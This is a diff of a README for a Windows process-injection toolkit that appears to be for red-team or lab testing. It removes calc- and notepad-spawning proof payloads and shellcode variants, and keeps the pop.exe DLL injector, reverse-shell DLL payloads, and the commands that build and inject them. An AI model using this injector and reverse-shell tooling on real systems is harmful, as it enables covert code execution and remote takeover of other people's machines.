@@ -14,19 +14,6 @@ process-injection-2/
 ├── pop.cpp                     injector v2 — flexible: target by PID/name,
 ├── pop.exe                        --dll / --spawn / --msg / --list modes.
 │                               ~300 lines.
-├── pop-calc/                   quick visual-proof payloads (pops calc.exe)
-│   ├── pop_calc.cpp
-│   ├── pop_calc.exe            standalone EXE
-│   ├── pop_calc_dll.cpp
-│   ├── pop_calc_dll.dll        DLL variant (for injection)
-│   └── build.ps1
-├── shellcode-inject/           shellcode-based variants (not reverse shell)
-│   ├── sc_injector.cpp         msfvenom shellcode (notepad)
-│   ├── sc_injector.exe
-│   ├── sc_infloop.cpp          2-byte jmp$ — target stays alive for inspection
-│   ├── sc_infloop.exe
-│   ├── pop_notepad_dll.cpp     DLL that spawns notepad from DllMain
-│   └── pop_notepad_dll.dll
 └── reverse-shell/              interactive-shell payloads
     ├── revshell_pure.cpp
     ├── revshell_pure.exe       standalone EXE
@@ -54,30 +41,19 @@ Edit these, rebuild.
 
 ```
 cl /EHsc /O2 /nologo pop.cpp /link psapi.lib user32.lib advapi32.lib /OUT:pop.exe
-
-cl /LD /EHsc /O2 /nologo pop-calc\pop_calc_dll.cpp         /OUT:pop-calc\pop_calc_dll.dll
 cl /LD /EHsc /O2 /nologo reverse-shell\revshell_pure_dll.cpp /link ws2_32.lib /OUT:reverse-shell\revshell_pure_dll.dll
 ```
 
-**Linux (one-liner — installs cross-compiler if missing, then builds everything)**:
+**Linux (one-liner — installs cross-compiler if missing, then builds the DLL)**:
 
 ```bash
 sudo apt install -y mingw-w64 && \
-  x86_64-w64-mingw32-g++ -shared -O2 -s -o pop-calc/pop_calc_dll.dll pop-calc/pop_calc_dll.cpp -Wl,--subsystem,windows,--kill-at && \
   x86_64-w64-mingw32-g++ -shared -O2 -s -o reverse-shell/revshell_pure_dll.dll reverse-shell/revshell_pure_dll.cpp -lws2_32 -Wl,--subsystem,windows,--kill-at
 ```
 
 (`pop.exe` is Windows-only — build on Windows with MSVC.)
 
 ## Use
-
-### Pop calc (visual proof, no listener needed)
-
-```powershell
-pop.exe <target_name_or_pid> --dll pop-calc\pop_calc_dll.dll
-```
-
-Calc appears as a child of the target. Target survives.
 
 ### Reverse shell (interactive)
 
